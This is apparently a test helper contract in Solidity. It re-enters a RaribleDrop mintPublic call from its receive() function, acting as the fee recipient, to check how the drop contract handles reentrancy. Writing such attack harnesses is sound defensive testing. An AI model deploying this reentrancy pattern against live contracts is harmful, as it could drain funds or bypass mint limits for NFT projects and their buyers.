// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { RaribleDrop } from "../RaribleDrop.sol";

contract MaliciousRecipient {
    bool public startAttack;
    address public token;
    RaribleDrop public seaDrop;

    receive() external payable {
        if (startAttack) {
            startAttack = false;
            seaDrop.mintPublic{ value: 1 ether }({
                nftContract: token,
                feeRecipient: address(this),
                minterIfNotPayer: address(this),
                quantity: 1
            });
        }
    }

    // Also receive some eth in the process
    function setStartAttack() public payable {
        startAttack = true;
    }

    function attack(RaribleDrop _seaDrop, address _token) external payable {
        token = _token;
        seaDrop = _seaDrop;

        _seaDrop.mintPublic{ value: 1 ether }({
            nftContract: _token,
            feeRecipient: address(this),
            minterIfNotPayer: address(this),
            quantity: 1
        });

        token = address(0);
        seaDrop = RaribleDrop(address(0));
    }
}
